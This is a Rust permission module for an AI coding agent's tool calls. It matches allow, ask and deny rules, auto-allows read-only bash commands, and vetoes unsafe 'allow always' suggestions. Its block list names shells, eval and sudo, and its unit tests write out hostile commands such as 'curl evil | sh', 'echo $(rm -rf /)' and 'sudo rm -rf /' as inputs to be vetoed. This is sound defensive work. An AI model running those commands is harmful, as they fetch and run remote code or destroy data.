//! Command permission management. Faithful port of `src/tools/permissions.ts`.
//!
//! Rule format: `Tool(body)`
//!   - Prefix rule: body ends with `:*` → matches when the summarized command
//!     equals the prefix or starts with `prefix + " "` (token boundary —
//!     `Bash(git push:*)` does NOT match `git pushx`).
//!   - Exact rule: no `:*` suffix → glob match (`*`/`**` → `.*`), anchored.
//!
//! Decision pipeline (most-specific & most-restrictive first, short-circuit):
//!   exact deny → exact ask → prefix deny → prefix ask
//!   → exact allow → prefix allow → read-only allowlist → passthrough

use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::sync::LazyLock;

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct PermissionConfig {
    #[serde(default)]
    pub allow: Vec<String>,
    #[serde(default)]
    pub deny: Vec<String>,
    #[serde(default)]
    pub ask: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PermissionDecision {
    Deny,
    Ask,
    Allow,
    Passthrough,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PermissionRule {
    pub tool: String,
    pub body: String,
    /// `Some(prefix)` for `:*` prefix rules (body without `:*`).
    pub prefix: Option<String>,
    pub raw: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum MatchKind {
    Exact,
    Prefix,
}

// Token shape for a command/subcommand: lowercase word, optional internal
// hyphens. Rejects flags (-x), paths (/usr/bin), filenames (a.txt), numbers.
static TOKEN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^[a-z][a-z0-9]*(-[a-z0-9]+)*$").unwrap());

static ENV_ASSIGN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^[A-Za-z_][A-Za-z0-9_]*=").unwrap());

static PARSE_RULE_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^([A-Za-z0-9_]+)\((.+)\)$").unwrap());

// Strip a leading `cd <dir> &&|;`.
static STRIP_CD_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"^cd\s+(?:"[^"]*"|'[^']*'|\S+)\s*(?:&&|;)\s*"#).unwrap());

// Harmless redirections: fd-merges (2>&1) and /dev/null sinks.
static SAFE_REDIRECT_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\s*(?:\d*>&\d+|&?>>?\s*/dev/null|\d+>\s*/dev/null)").unwrap());

// Shell metacharacters that make a command compound/injectable.
static SHELL_OPS_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[;&|`]|\$\(|\|\||&&|[<>]").unwrap());

// Command separators we can safely split a compound command on.
static CMD_SEPARATORS_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\s*(?:&&|\|\||;|\|)\s*").unwrap());

const SAFE_ENV_VARS: &[&str] = &[
    "NODE_ENV",
    "CI",
    "DEBUG",
    "LOG_LEVEL",
    "FORCE_COLOR",
    "NO_COLOR",
    "TZ",
    "LANG",
    "LC_ALL",
];

const DANGEROUS_PREFIXES: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "fish",
    "csh",
    "tcsh",
    "ksh",
    "dash",
    "cmd",
    "powershell",
    "pwsh",
    "env",
    "xargs",
    "eval",
    "exec",
    "source",
    "nice",
    "stdbuf",
    "nohup",
    "timeout",
    "time",
    "sudo",
    "doas",
    "pkexec",
];

const READ_ONLY_COMMANDS: &[&str] = &[
    "ls", "pwd", "cat", "head", "tail", "wc", "echo", "printf", "which", "type", "whoami",
    "hostname", "date", "uname", "tree", "file", "stat", "du", "df", "basename", "dirname",
    "realpath", "readlink", "sort", "uniq", "cut", "column", "id", "groups", "rg", "grep", "find",
    "fd", "fdfind", "ag",
];

const READ_ONLY_GIT_SUBCOMMANDS: &[&str] = &[
    "status",
    "diff",
    "log",
    "show",
    "branch",
    "remote",
    "rev-parse",
    "describe",
    "tag",
];

fn arg_str(args: &Value, key: &str) -> String {
    args.get(key)
        .and_then(Value::as_str)
        .unwrap_or("")
        .to_string()
}

fn strip_cd_prefix(cmd: &str) -> String {
    let trimmed = cmd.trim();
    STRIP_CD_RE.replace(trimmed, "").trim().to_string()
}

fn normalize_command(cmd: &str) -> String {
    let stripped = strip_cd_prefix(cmd);
    SAFE_REDIRECT_RE
        .replace_all(&stripped, "")
        .trim()
        .to_string()
}

/// Single source of truth: what permission rules are matched against.
pub fn summarize(tool_name: &str, args: &Value) -> String {
    match tool_name {
        "bash" => normalize_command(&arg_str(args, "command")),
        "read_file" | "write_file" | "edit_file" => arg_str(args, "file_path").replace('\\', "/"),
        "glob" | "grep" => arg_str(args, "pattern"),
        "web_search" => arg_str(args, "query"),
        "web_fetch" => arg_str(args, "url"),
        _ => serde_json::to_string(args).unwrap_or_default(),
    }
}

/// Map internal tool name → the name used inside permission rules.
pub fn tool_rule_name(name: &str) -> String {
    match name {
        "bash" => "Bash",
        "read_file" => "Read",
        "write_file" => "Write",
        "edit_file" => "Edit",
        "glob" => "Glob",
        "grep" => "Grep",
        "web_search" => "WebSearch",
        "web_fetch" => "WebFetch",
        other => other,
    }
    .to_string()
}

/// Parse `Bash(git push:*)` → structured rule (None if malformed).
pub fn parse_permission_rule(raw: &str) -> Option<PermissionRule> {
    let caps = PARSE_RULE_RE.captures(raw)?;
    let tool = caps[1].to_string();
    let body = caps[2].to_string();
    let prefix = body.strip_suffix(":*").map(|s| s.to_string());
    Some(PermissionRule {
        tool,
        body,
        prefix,
        raw: raw.to_string(),
    })
}

fn glob_to_regex(glob: &str) -> Regex {
    // Normalize backslashes to forward slashes so persisted rules (whose dir
    // parts come from dirname, which uses `\` on Windows) match the normalized
    // summary (which uses `/`).
    let normalized = glob.replace('\\', "/");
    let mut escaped = String::with_capacity(normalized.len() + 2);
    for c in normalized.chars() {
        match c {
            '.' | '+' | '^' | '$' | '{' | '}' | '(' | ')' | '|' | '[' | ']' | '\\' => {
                escaped.push('\\');
                escaped.push(c);
            }
            '*' => escaped.push_str(".*"),
            _ => escaped.push(c),
        }
    }
    Regex::new(&format!("^{escaped}$")).unwrap()
}

fn match_rule(rule: &PermissionRule, rule_name: &str, summary: &str) -> Option<MatchKind> {
    if rule.tool != rule_name {
        return None;
    }
    if let Some(prefix) = &rule.prefix {
        if summary == prefix {
            return Some(MatchKind::Prefix);
        }
        if summary.starts_with(&format!("{prefix} ")) {
            return Some(MatchKind::Prefix);
        }
        return None;
    }
    if glob_to_regex(&rule.body).is_match(summary) {
        Some(MatchKind::Exact)
    } else {
        None
    }
}

/// Does any rule in `list` match, and how (exact takes priority over prefix)?
fn list_match(list: &[String], rule_name: &str, summary: &str) -> Option<MatchKind> {
    let mut prefix_hit = false;
    for raw in list {
        let Some(rule) = parse_permission_rule(raw) else {
            continue;
        };
        match match_rule(&rule, rule_name, summary) {
            Some(MatchKind::Exact) => return Some(MatchKind::Exact),
            Some(MatchKind::Prefix) => prefix_hit = true,
            None => {}
        }
    }
    prefix_hit.then_some(MatchKind::Prefix)
}

/// Is this bash command a safe, side-effect-free read-only invocation?
pub fn is_read_only_command(command: &str) -> bool {
    let cmd = normalize_command(command);
    if cmd.is_empty() || SHELL_OPS_RE.is_match(&cmd) {
        return false;
    }
    let tokens: Vec<&str> = cmd.split_whitespace().collect();
    let Some(&first) = tokens.first() else {
        return false;
    };
    if first == "git" {
        return tokens.len() >= 2 && READ_ONLY_GIT_SUBCOMMANDS.contains(&tokens[1]);
    }
    READ_ONLY_COMMANDS.contains(&first)
}

/// Ordered permission decision for a tool call. Read-only auto-allow applies to
/// bash only (read/glob/grep don't reach here).
pub fn check_permission(
    perm: Option<&PermissionConfig>,
    tool_name: &str,
    args: &Value,
) -> PermissionDecision {
    let empty = PermissionConfig::default();
    let p = perm.unwrap_or(&empty);

    // MCP tools use bare-name rules (`mcp__server__tool` exact, or `mcp__server`
    // for the whole server) rather than the `Tool(body)` form. Precedence:
    // deny > ask > allow, else passthrough (→ prompt). Mirrors Claude Code.
    if let Some((server, _tool)) = crate::mcp::parse_tool_name(tool_name) {
        let server_rule = format!("{}{server}", crate::mcp::MCP_TOOL_PREFIX);
        let hits = |list: &[String]| list.iter().any(|r| r == tool_name || *r == server_rule);
        if hits(&p.deny) {
            return PermissionDecision::Deny;
        }
        if hits(&p.ask) {
            return PermissionDecision::Ask;
        }
        if hits(&p.allow) {
            return PermissionDecision::Allow;
        }
        return PermissionDecision::Passthrough;
    }

    // Auto-memory carve-out: reads/writes/edits/searches inside the memory
    // directory (~/.deepdive/projects/<slug>/memory/) never prompt, in any mode.
    // The dir is outside cwd, so without this the out-of-workspace gate would ask
    // on every memory write. Grep/glob carry the path in `path`, file tools in
    // `file_path`. Mirrors the TS carve-out and Claude Code's isAutoMemPath.
    if matches!(
        tool_name,
        "read_file" | "write_file" | "edit_file" | "grep" | "glob"
    ) {
        let target = args
            .get("file_path")
            .or_else(|| args.get("path"))
            .and_then(Value::as_str)
            .unwrap_or("");
        if crate::memory::paths::is_auto_mem_path(target) {
            return PermissionDecision::Allow;
        }
    }

    let rule_name = tool_rule_name(tool_name);
    let summary = summarize(tool_name, args);

    let deny = list_match(&p.deny, &rule_name, &summary);
    let ask = list_match(&p.ask, &rule_name, &summary);
    let allow = list_match(&p.allow, &rule_name, &summary);

    // exact (most specific) deny/ask before any prefix rule
    if deny == Some(MatchKind::Exact) {
        return PermissionDecision::Deny;
    }
    if ask == Some(MatchKind::Exact) {
        return PermissionDecision::Ask;
    }
    if deny == Some(MatchKind::Prefix) {
        return PermissionDecision::Deny;
    }
    if ask == Some(MatchKind::Prefix) {
        return PermissionDecision::Ask;
    }
    if allow == Some(MatchKind::Exact) || allow == Some(MatchKind::Prefix) {
        return PermissionDecision::Allow;
    }
    if tool_name == "bash" && is_read_only_command(&arg_str(args, "command")) {
        return PermissionDecision::Allow;
    }
    PermissionDecision::Passthrough
}

enum SegRule {
    /// Veto the whole suggestion (unsafe / un-constrainable).
    Veto,
    /// Skip this segment (harmless, e.g. `cd`).
    Skip,
    Rule(String),
}

/// Derive a reusable prefix rule for one already-split command segment.
fn bash_segment_rule(rule_name: &str, seg: &str) -> SegRule {
    if SHELL_OPS_RE.is_match(seg) {
        return SegRule::Veto; // leftover ` $() & <> → un-constrainable
    }
    let tokens: Vec<&str> = seg.split_whitespace().collect();
    let mut i = 0;
    while i < tokens.len() && ENV_ASSIGN_RE.is_match(tokens[i]) {
        let name = tokens[i].split('=').next().unwrap_or("");
        if !SAFE_ENV_VARS.contains(&name) {
            return SegRule::Veto; // unsafe env → exact only
        }
        i += 1;
    }
    let rest = &tokens[i..];
    let Some(&command) = rest.first() else {
        return SegRule::Skip;
    };
    if command == "cd" {
        return SegRule::Skip; // dir change is side-effect-free; skip, don't veto
    }
    if !TOKEN_RE.is_match(command) {
        return SegRule::Veto; // path/flag
    }
    if DANGEROUS_PREFIXES.contains(&command) {
        return SegRule::Veto;
    }
    if let Some(&sub) = rest.get(1) {
        if TOKEN_RE.is_match(sub) {
            return SegRule::Rule(format!("{rule_name}({command} {sub}:*)"));
        }
    }
    SegRule::Rule(format!("{rule_name}({command}:*)"))
}

/// node `path.dirname` — platform-aware separators (POSIX on Unix, `\` too on
/// Windows). Matches the TS port's behavior on each platform.
fn dirname(path: &str) -> String {
    let is_sep = |c: char| c == '/' || (cfg!(windows) && c == '\\');
    if path.is_empty() {
        return ".".to_string();
    }
    let trimmed = path.trim_end_matches(is_sep);
    if trimmed.is_empty() {
        return "/".to_string();
    }
    match trimmed.rfind(is_sep) {
        None => ".".to_string(),
        Some(0) => trimmed[..1].to_string(),
        Some(i) => trimmed[..i].to_string(),
    }
}

/// Auto-suggest reusable permission patterns for the "Allow always" action.
/// Returns None when no safe, reusable pattern exists.
pub fn suggest_permission_pattern(tool_name: &str, args: &Value) -> Option<Vec<String>> {
    // MCP: "allow always" persists the exact tool rule (`mcp__server__tool`).
    // A whole-server grant (`mcp__server`) is left to be added manually.
    if crate::mcp::parse_tool_name(tool_name).is_some() {
        return Some(vec![tool_name.to_string()]);
    }

    let rule_name = tool_rule_name(tool_name);

    if tool_name == "bash" {
        let cmd = normalize_command(&arg_str(args, "command"));
        if cmd.is_empty() {
            return None;
        }
        let mut rules: Vec<String> = Vec::new();
        for raw in CMD_SEPARATORS_RE.split(&cmd) {
            let seg = raw.trim();
            if seg.is_empty() {
                continue;
            }
            match bash_segment_rule(&rule_name, seg) {
                SegRule::Veto => return None, // any unsafe segment → veto the bundle
                SegRule::Skip => {}
                SegRule::Rule(r) => {
                    if !rules.contains(&r) {
                        rules.push(r);
                    }
                }
            }
        }
        return (!rules.is_empty()).then_some(rules);
    }

    if tool_name == "read_file" {
        let raw = arg_str(args, "file_path");
        if raw.is_empty() {
            return None;
        }
        let norm = raw.replace('\\', "/");
        let dir = dirname(&raw).replace('\\', "/");
        if dir.is_empty() || dir == "/" || dir == "." {
            return Some(vec![format!("{rule_name}({norm})")]);
        }
        return Some(vec![format!("{rule_name}({dir}/**)")]);
    }

    if tool_name == "write_file" || tool_name == "edit_file" {
        // No persisted single-file allow rule for writes (session dir grant /
        // acceptEdits handle these in the approval UI).
        return None;
    }

    if tool_name == "glob" || tool_name == "grep" {
        let pattern = arg_str(args, "pattern");
        return (!pattern.is_empty()).then(|| vec![format!("{rule_name}({pattern})")]);
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn perm(allow: &[&str], deny: &[&str], ask: &[&str]) -> PermissionConfig {
        PermissionConfig {
            allow: allow.iter().map(|s| s.to_string()).collect(),
            deny: deny.iter().map(|s| s.to_string()).collect(),
            ask: ask.iter().map(|s| s.to_string()).collect(),
        }
    }
    fn bash(cmd: &str) -> Value {
        json!({ "command": cmd })
    }
    fn check(p: PermissionConfig, tool: &str, args: Value) -> PermissionDecision {
        check_permission(Some(&p), tool, &args)
    }

    #[test]
    fn parse_prefix_and_exact_rules() {
        let r = parse_permission_rule("Bash(git push:*)").unwrap();
        assert_eq!(r.tool, "Bash");
        assert_eq!(r.body, "git push:*");
        assert_eq!(r.prefix.as_deref(), Some("git push"));
        assert_eq!(
            parse_permission_rule("Read(/etc/hosts)").unwrap().prefix,
            None
        );
        assert!(parse_permission_rule("nonsense").is_none());
    }

    #[test]
    fn summarize_strips_cd_and_safe_redirects() {
        assert_eq!(
            summarize("bash", &bash("cd /tmp && pnpm install")),
            "pnpm install"
        );
        assert_eq!(
            summarize("bash", &bash("cd /repo && pnpm typecheck 2>&1")),
            "pnpm typecheck"
        );
        assert_eq!(summarize("bash", &bash("foo > /dev/null 2>&1")), "foo");
        // a redirect to a real file stays (stays guarded)
        assert_eq!(summarize("bash", &bash("cmd > out.txt")), "cmd > out.txt");
        assert_eq!(summarize("read_file", &json!({"file_path":"/a/b"})), "/a/b");
        assert_eq!(summarize("grep", &json!({"pattern":"foo"})), "foo");
    }

    #[test]
    fn prefix_matching_token_boundary() {
        assert_eq!(
            check(
                perm(&["Bash(pnpm:*)"], &[], &[]),
                "bash",
                bash("pnpm install foo")
            ),
            PermissionDecision::Allow
        );
        assert_eq!(
            check(perm(&["Bash(pnpm:*)"], &[], &[]), "bash", bash("pnpm")),
            PermissionDecision::Allow
        );
        assert_eq!(
            check(
                perm(&["Bash(pnpm:*)"], &[], &[]),
                "bash",
                bash("pnpmx evil")
            ),
            PermissionDecision::Passthrough
        );
    }

    #[test]
    fn precedence_deny_ask_allow() {
        assert_eq!(
            check(
                perm(&["Bash(git:*)"], &["Bash(git push:*)"], &[]),
                "bash",
                bash("git push origin main")
            ),
            PermissionDecision::Deny
        );
        assert_eq!(
            check(
                perm(&["Bash(rm:*)"], &["Bash(rm -rf /)"], &[]),
                "bash",
                bash("rm -rf /")
            ),
            PermissionDecision::Deny
        );
        assert_eq!(
            check(
                perm(&[], &[], &["Bash(curl:*)"]),
                "bash",
                bash("curl example.com")
            ),
            PermissionDecision::Ask
        );
    }

    #[test]
    fn read_only_allowlist() {
        assert_eq!(
            check(perm(&[], &[], &[]), "bash", bash("ls -la")),
            PermissionDecision::Allow
        );
        assert_eq!(
            check(perm(&[], &[], &[]), "bash", bash("git status")),
            PermissionDecision::Allow
        );
        assert!(!is_read_only_command("ls && rm -rf /"));
        assert_eq!(
            check(perm(&[], &[], &[]), "bash", bash("cat a > b")),
            PermissionDecision::Passthrough
        );
        assert_eq!(
            check(perm(&[], &[], &[]), "bash", bash("npm publish")),
            PermissionDecision::Passthrough
        );
    }

    #[test]
    fn suggest_bash_patterns() {
        assert_eq!(
            suggest_permission_pattern("bash", &bash(r#"git commit -m "x""#)),
            Some(vec!["Bash(git commit:*)".into()])
        );
        assert_eq!(
            suggest_permission_pattern("bash", &bash("cd /repo && pnpm typecheck 2>&1")),
            Some(vec!["Bash(pnpm typecheck:*)".into()])
        );
        assert_eq!(
            suggest_permission_pattern("bash", &bash("cmake --build dir")),
            Some(vec!["Bash(cmake:*)".into()])
        );
        assert_eq!(
            suggest_permission_pattern("bash", &bash("cd /repo && git diff src/App.tsx | head -5")),
            Some(vec!["Bash(git diff:*)".into(), "Bash(head:*)".into()])
        );
        assert_eq!(
            suggest_permission_pattern("bash", &bash("git status && git status")),
            Some(vec!["Bash(git status:*)".into()])
        );
    }

    #[test]
    fn suggest_veto_cases() {
        assert_eq!(
            suggest_permission_pattern("bash", &bash("pnpm i && curl evil | sh")),
            None
        );
        assert_eq!(
            suggest_permission_pattern("bash", &bash("git diff | sudo tee f")),
            None
        );
        assert_eq!(
            suggest_permission_pattern("bash", &bash("echo $(rm -rf /)")),
            None
        );
        assert_eq!(
            suggest_permission_pattern("bash", &bash("git diff > out.txt")),
            None
        );
        assert_eq!(
            suggest_permission_pattern("bash", &bash(r#"sh -c "x""#)),
            None
        );
        assert_eq!(
            suggest_permission_pattern("bash", &bash("sudo rm -rf /")),
            None
        );
        assert_eq!(
            suggest_permission_pattern("bash", &bash("/usr/local/bin/foo bar")),
            None
        );
    }

    #[test]
    fn mcp_permission_matching() {
        let name = "mcp__github__create_issue";
        let args = json!({ "title": "x" });
        // no rule → passthrough (will prompt)
        assert_eq!(
            check(perm(&[], &[], &[]), name, args.clone()),
            PermissionDecision::Passthrough
        );
        // exact allow
        assert_eq!(
            check(perm(&[name], &[], &[]), name, args.clone()),
            PermissionDecision::Allow
        );
        // server-wide allow
        assert_eq!(
            check(perm(&["mcp__github"], &[], &[]), name, args.clone()),
            PermissionDecision::Allow
        );
        // deny beats allow
        assert_eq!(
            check(perm(&["mcp__github"], &[name], &[]), name, args.clone()),
            PermissionDecision::Deny
        );
        // ask beats allow
        assert_eq!(
            check(perm(&["mcp__github"], &[], &[name]), name, args.clone()),
            PermissionDecision::Ask
        );
        // a rule for a different server does not match
        assert_eq!(
            check(perm(&["mcp__gitlab"], &[], &[]), name, args),
            PermissionDecision::Passthrough
        );
    }

    #[test]
    fn mcp_suggest_pattern_is_exact_tool() {
        assert_eq!(
            suggest_permission_pattern("mcp__github__create_issue", &json!({})),
            Some(vec!["mcp__github__create_issue".to_string()])
        );
    }

    #[test]
    fn suggest_file_tool_patterns() {
        assert_eq!(
            suggest_permission_pattern("write_file", &json!({"file_path":"/a/b.ts"})),
            None
        );
        assert_eq!(
            suggest_permission_pattern("edit_file", &json!({"file_path":"/a/b.ts"})),
            None
        );
        assert_eq!(
            suggest_permission_pattern("read_file", &json!({"file_path":"/tmp/deepdive-test.txt"})),
            Some(vec!["Read(/tmp/**)".into()])
        );
        assert_eq!(
            suggest_permission_pattern("read_file", &json!({"file_path":"/passwd"})),
            Some(vec!["Read(/passwd)".into()])
        );
    }

    #[test]
    fn windows_path_handling() {
        // summarize normalizes backslashes to forward slashes (cross-platform).
        assert_eq!(
            summarize(
                "read_file",
                &json!({"file_path":"D:\\code\\claude-code\\src\\utils\\handlePromptSubmit.ts"})
            ),
            "D:/code/claude-code/src/utils/handlePromptSubmit.ts"
        );
        // A rule persisted with backslashes matches the normalized summary.
        assert_eq!(
            check(
                perm(&["Read(D:\\code\\claude-code\\src\\utils/**)"], &[], &[]),
                "read_file",
                json!({"file_path":"D:\\code\\claude-code\\src\\utils\\handlePromptSubmit.ts"})
            ),
            PermissionDecision::Allow
        );
        assert_eq!(
            check(
                perm(&["Read(D:\\code\\claude-code\\src\\utils/**)"], &[], &[]),
                "read_file",
                json!({"file_path":"D:\\code\\claude-code\\src\\utils\\sub\\deep.ts"})
            ),
            PermissionDecision::Allow
        );
        // suggest: on Unix, dirname of a backslash path is "." (node POSIX
        // semantics — the TS suite's `/**` expectation only holds on Windows),
        // so we fall back to the exact normalized path. On Windows this yields
        // `Read(D:/code/claude-code/src/utils/**)`.
        let suggested = suggest_permission_pattern(
            "read_file",
            &json!({"file_path":"D:\\code\\claude-code\\src\\utils\\handlePromptSubmit.ts"}),
        );
        if cfg!(windows) {
            assert_eq!(
                suggested,
                Some(vec!["Read(D:/code/claude-code/src/utils/**)".into()])
            );
        } else {
            assert_eq!(
                suggested,
                Some(vec![
                    "Read(D:/code/claude-code/src/utils/handlePromptSubmit.ts)".into()
                ])
            );
        }
    }
}
